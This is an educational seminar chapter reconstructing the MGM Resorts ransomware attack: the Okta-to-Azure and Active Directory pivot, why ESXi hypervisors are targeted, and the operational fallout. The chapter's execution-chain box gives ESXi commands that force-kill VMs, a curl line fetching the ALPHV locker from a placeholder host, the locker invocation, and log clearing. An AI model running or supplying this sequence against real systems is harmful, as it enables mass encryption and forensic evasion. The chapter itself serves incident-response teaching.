# Chapter 05: Lateral Movement & ESXi Mass Encryption

> **Seminar Module:** Cross-Domain Pivoting, Virtualization Exploitation & Mass Ransomware Impact  
> **Target Audience:** Cloud Engineers, Infrastructure Administrators, Virtualization Architects, Incident Responders  
> **Core Technologies:** Microsoft Entra ID, Active Directory, VMware vCenter, ESXi Hypervisors, ALPHV Rust Locker

---

## 1. Phase 6: Lateral Movement into Azure and Active Directory

With administrative dominance established inside Okta, Scattered Spider possessed the ultimate master key. Rather than lingering in SaaS portals, the attackers systematically expanded their footprint across MGM's hybrid infrastructure.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    HYBRID CLOUD LATERAL MOVEMENT FLOW                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  [Okta Super Admin] ──(SAML SSO)──► [Microsoft Entra ID / Azure AD]         │
│          │                                   │                              │
│          │                                   ▼                              │
│          │                         [Global Administrator]                   │
│          │                         • Assigns Role Assignments               │
│          │                         • Microsoft Graph API Discovery          │
│          │                         • Enumerate Hybrid Cloud VMs             │
│          │                                   │                              │
│          ▼                                   ▼                              │
│  [Azure AD Connect / Cloud Sync] ──► [On-Premises Active Directory]         │
│                                              │                              │
│                                              ▼                              │
│                                    [Domain Controllers]                     │
│                                    • Extract Kerberos Tickets               │
│                                    • Harvest vCenter Service Accounts       │
│                                    • Locate ESXi Hypervisor Subnets         │
└─────────────────────────────────────────────────────────────────────────────┘
```

### The Okta-to-Azure Pivot
MGM utilized federated single sign-on between Okta and Microsoft Entra ID. Because the threat actor controlled the Okta Super Administrator role, they authenticated directly into the Azure Portal as an Azure AD Global Administrator without encountering secondary challenge prompts:
1. **Azure Active Directory Synchronization (AAD Connect):** The attackers analyzed directory synchronization configurations to map the relationship between cloud identities and on-premises Active Directory forests.
2. **Graph API Reconnaissance:** Using the Microsoft Graph PowerShell SDK and automated reconnaissance scripts, the attackers queried tenant-wide group memberships, enterprise applications, and resource group ownership.
3. **Pivoting to On-Premises Domain Controllers:** The attackers leveraged cloud-hosted administrative virtual machines with network connectivity to on-premises management subnets, establishing remote desktop (RDP) and remote PowerShell sessions into on-premises Domain Controllers.

---

## 2. Phase 7: Virtualization Targeting — Why Attackers Target ESXi

In modern enterprise data centers, 80% to 90% of all servers do not exist as physical hardware; they run as virtual machines (VMs) hosted on hypervisor platforms like **VMware vSphere ESXi**.

Scattered Spider and ALPHV recognized a fundamental architectural asymmetry: **targeting individual Windows guest operating systems is inefficient; targeting the underlying hypervisor is devastating.**

```
TRADITIONAL ENDPOINT ATTACK                 HYPERVISOR ATTACK (ESXi)
Encrypt 100 Windows OS instances:           Encrypt 1 Hypervisor Host:
• 100 separate malware executions           • 1 command terminates 100 VMs
• 100 EDR agents detecting / killing        • ZERO guest EDR visibility
• Takes hours; triggers thousands of alerts • Takes 90 seconds; completely blind
```

### The Hypervisor Security Blind Spot
1. **Lack of Native EDR Agents:** While enterprise Windows and Linux servers run sophisticated behavioral detection software (e.g., CrowdStrike Falcon, Microsoft Defender for Endpoint), VMware ESXi runs a proprietary, stripped-down Linux-like microkernel (**VMkernel**). Traditional endpoint security agents cannot be installed directly on ESXi hosts.
2. **Instant VM Termination:** By executing management commands at the hypervisor level, an attacker can forcibly power off every running database, web server, and application in seconds.
3. **Destruction of Virtual Disks:** Virtual machines store their file systems inside virtual disk containers (`.vmdk` files). Encrypting the outer `.vmdk` file renders the entire guest operating system, application stack, and internal databases permanently unbootable.
4. **Snapshot Neutralization:** Hypervisor-level snapshots (`.vmsn`) and delta disks stored on the same VMFS/NFS datastore are encrypted simultaneously, destroying the fastest recovery option.

---

## 3. The ALPHV/BlackCat ESXi Payload Execution Sequence

Once administrative credentials for VMware vCenter and ESXi root access were obtained via compromised administrative vaults, the ALPHV affiliate executed the ransomware payload across MGM's hypervisor clusters.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                   ALPHV / BLACKCAT ESXi EXECUTION CHAIN                     │
├─────────────────────────────────────────────────────────────────────────────┤
│  STEP 1: Ingress via SSH / API                                              │
│  Attacker establishes direct SSH or ESXi web API connections using root     │
│  or administrative service account credentials.                             │
│                                                                             │
│  STEP 2: VM Enumeration & Process Termination                               │
│  # esxcli vm process list                                                   │
│  # esxcli vm process kill --type=force --world-id=<WorldID>                 │
│  # vim-cmd vmsvc/power.off <VM_ID>                                          │
│                                                                             │
│  STEP 3: Payload Delivery                                                   │
│  Transfers ELF binary compiled for Linux/ESXi:                              │
│  # curl -O http://staging.internal/alphv_esxi                               │
│  # chmod +x alphv_esxi                                                      │
│                                                                             │
│  STEP 4: Multithreaded Datastore Encryption                                 │
│  # ./alphv_esxi --access-token <UUID> --no-prop-servers --paths /vmfs/volumes│
│  Asynchronously encrypts all .vmdk, .vmx, .vmsn, .vmem files using          │
│  ChaCha20-Poly1305 with RSA-4096 public key encapsulation.                   │
│                                                                             │
│  STEP 5: Drop Ransom Note & Clear Host Logs                                 │
│  Ransom notes dropped: /vmfs/volumes/<Datastore>/README.txt                 │
│  ESXi host syslog cleared to impede post-incident forensic recovery.        │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Targeted File Extensions on ESXi Datastores
The ALPHV ESXi locker binary specifically scans `/vmfs/volumes/` for virtualization file formats:
* `.vmdk` (Virtual Machine Disk)
* `.vmx` (Virtual Machine Configuration)
* `.vmsn` (Virtual Machine Snapshot State)
* `.vmem` (Virtual Machine Memory Dump)
* `.nvram` (Virtual Machine BIOS State)
* `.log` (Hypervisor and VM Activity Logs)

---

## 4. Phase 8: Operational Disruption Across the Enterprise

When over 100 ESXi hypervisor hosts were encrypted, the underlying virtual machines powering MGM's critical business applications collapsed simultaneously. The digital failure manifested immediately in physical operations across the Las Vegas Strip and regional resorts:

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│                   PHYSICAL IMPACT OF HYPERVISOR ENCRYPTION                       │
├─────────────────────────┬────────────────────────────┬───────────────────────────┤
│      CASINO FLOOR       │     HOTEL & RESERVATIONS   │      FOOD & BEVERAGE      │
├─────────────────────────┼────────────────────────────┼───────────────────────────┤
│ • Slot machines reboot  │ • Digital mobile keys      │ • Micros Symphony POS     │
│   and display tilt code   inoperative (BLE failure)    systems completely dark   │
│ • TITO voucher printers │ • Front desk OPERA PMS     │ • Bars & restaurants      │
│   fail; cashiers forced   offline; manual paper check- forced into cash-only     │
│   into hand-payouts       ins with 4-hour queues       transactions              │
│ • Player loyalty points │ • Web & mobile app booking │ • Room service, spa, and  │
│   (MGM Rewards) frozen    reservations disabled        ticketing cancelled       │
└─────────────────────────┴────────────────────────────┴───────────────────────────┘
```

### Casino Management Systems (CMS) & Slot Floor Chaos
Modern slot machines are networked thin clients connected back to centralized database clusters hosting the Casino Management System (CMS). When the backend database VMs were encrypted:
* Slot machines lost contact with the validation server and entered an automated security lockout ("Tilt Mode").
* Ticket-In / Ticket-Out (TITO) ticket printing failed, meaning players could not cash out electronically.
* Floor staff were required to walk the casino floor with physical cash bags and paper logbooks to perform manual hand-payouts.

### The Mobile Key and Hotel Lock Failure
MGM had heavily invested in digital transformation, allowing guests to use their smartphones as hotel room keys via the MGM Rewards app:
* The backend API servers validating digital key tokens ran on the encrypted virtualization cluster.
* When the servers went down, thousands of guests were locked out of their hotel rooms.
* Front-desk staff lacked working key-card encoders, resulting in massive, multi-hour lines stretching through the lobbies of the MGM Grand, Bellagio, and ARIA.

---

## 5. Phase 9: Data Exfiltration and the Extortion Campaign

In addition to deploying ransomware, Scattered Spider and ALPHV engaged in **Double Extortion**:
* Prior to triggering the ransomware locker, the threat actors exfiltrated sensitive data stores using cloud-native synchronization tools (e.g., Rclone, MegaCmd) tunneled through encrypted HTTPS connections.
* The stolen data encompassed customer personal information, including names, contact details, dates of birth, and driver's license numbers. For a limited subset of patrons, Social Security numbers and passport numbers were also exposed.
* ALPHV initiated communication via their Tor extortion portal, presenting multi-million dollar ransom demands to decrypt the hypervisors and prevent the public release of the stolen records.

---

## 6. Seminar Discussion Questions

1. **Hypervisor Defense Disparity:** Why do modern enterprise SOCs maintain extensive visibility into Windows endpoints, yet possess virtually zero real-time detection telemetry for ESXi VMkernel process executions?
2. **Air-Gapped vs. Networked Backups:** If an enterprise maintains automated daily backups, but those backups are accessible via network shares mounted to the same hypervisors, how does ransomware guarantee total data loss?
